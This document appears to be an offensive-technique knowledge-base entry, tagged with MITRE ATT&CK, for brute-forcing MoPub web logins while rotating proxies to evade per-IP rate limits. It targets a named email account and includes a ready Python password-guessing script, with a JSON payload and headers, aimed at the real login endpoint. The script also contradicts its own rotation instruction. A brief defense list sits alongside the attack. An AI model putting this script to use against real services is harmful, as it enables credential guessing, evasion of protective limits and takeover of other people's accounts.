---
tags:
  - brute-force
  - proxy-rotation
  - bypass
type: procedure
tools:
  - '[[tools/ProxyRequests]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/mopub-login-payload-example]]'
platforms:
  - Web
techniques:
  - '[[Brute Force]]'
  - '[[Connection Proxy]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Password Guessing]]'
id: b2ca8113-a173-4bda-932e-b56c24883df0
created_at: '2025-12-14T17:30:26.742Z'
updated_at: '2025-12-14T17:30:26.742Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Connection Proxy]]'
---
# Bypass-Rate-Limiting-Using-Proxy-Rotation-in-Python

## Summary

This procedure bypasses MoPub's IP-based rate limiting by using the ProxyRequests library to rotate through multiple proxies while brute-forcing passwords, enabling uninterrupted attempts.

## Description

After confirming the IP ban threshold, rotate proxies to distribute requests across IPs, avoiding per-IP limits. Target the login endpoint with a fixed username and password list, parsing responses for success (204) or failure (401/400). This scales attacks without account-level interruptions.

## Requirements

1. Python environment with ProxyRequests installed
2. List of proxies (e.g., SOCKS or HTTP)
3. Password list and target username
4. Valid headers including CSRF token and cookies

## Defense

Defensive measures and detection strategies:

- Track login attempts per username across IPs
- Implement behavioral analysis for proxy patterns
- Use CAPTCHA or multi-factor after suspicious activity

## Objectives

1. Evade IP bans for continuous brute-force
2. Detect successful credential guess (204 response)
3. Scale to thousands of attempts

## Instructions

### Step 1: Prepare Payload and Headers

**Context**: Use the standard JSON payload as in [[commands/mopub-login-payload-example]].

**Command** ([[commands/mopub-login-payload-example]]):
```json
{"username":"alert.wids@gmail.com","password":"$pass"}
```

> Set headers: {'Content-Type': 'application/json', 'x-csrftoken': 'value', 'Origin': 'https://app.mopub.com', 'Referer': 'https://app.mopub.com/login'}.

### Step 2: Implement Proxy Rotation Script

**Context**: Write a Python script to cycle proxies and send requests.

**Command** (Python script using ProxyRequests):
```python
import proxyrequests as pr
proxies = ['http://proxy1:port', 'http://proxy2:port']
passwords = open('PASS_LIST').readlines()
headers = {'x-csrftoken': '███████', 'Content-Type': 'application/json'}
for proxy in proxies:
    session = pr.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    for pwd in passwords:
        pwd = pwd.strip()
        resp = session.post('https://app.mopub.com/web-client/api/user/login', json={'username': 'alert.wids@gmail.com', 'password': pwd}, headers=headers)
        if resp.status_code == 204:
            print(f'Success with {pwd} via {proxy}')
        elif resp.status_code in [400, 401]:
            print(f'Failed {pwd} via {proxy}')
```

> Rotate after every 5-10 requests per proxy to mimic Step 1 limits.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force
- [[Connection Proxy]] Proxy

### Sub-Techniques

- [[Password Guessing]] Password Guessing

## Commands Used

- [[commands/mopub-login-payload-example]]

## Tools Used

- [[tools/ProxyRequests]]

## Tags

- brute-force
- proxy-rotation
- bypass
